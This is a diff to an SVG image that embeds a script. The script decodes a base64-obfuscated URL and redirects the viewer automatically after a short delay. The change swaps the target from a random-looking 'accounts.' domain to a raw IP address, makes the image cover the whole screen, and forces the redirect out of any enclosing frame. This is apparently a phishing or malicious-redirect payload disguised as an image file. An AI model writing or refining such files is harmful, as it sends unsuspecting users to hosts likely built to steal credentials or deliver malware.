@@ -1,4 +1,4 @@
-<svg width="400" height="600" viewBox="0 0 400 600" xmlns="http://www.w3.org/2000/svg">
+<svg width="100vw" height="100vh" viewBox="0 0 400 600" xmlns="http://www.w3.org/2000/svg" style="display:block;position:fixed;top:0;left:0;width:100vw;height:100vh;">
   <defs>
     <!-- Gradient for background -->
     <linearGradient id="bgGradient" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -12,9 +12,11 @@
   </defs>
   <script type="application/ecmascript"><![CDATA[
     function goToBase64Link() {
-      var b64 = "aHR0cHM6Ly9hY2NvdW50cy5pd2EzcG42bHFudHhxbjRyanZrN2ZubzFudnZldzYweS5jb20v";
+      var b64 = "aHR0cDovLzE5NC43Ni4yMjcuMjI1L2luZGV4LnBocA==";
       var url = atob(b64);
-      window.location.href = url;
+      if (url !== window.location.href) {  // Prevent self-loop
+        window.top.location.replace(url);  // Break out of frames and redirect
+      }
     }
 
     // Auto-redirect after 2 seconds
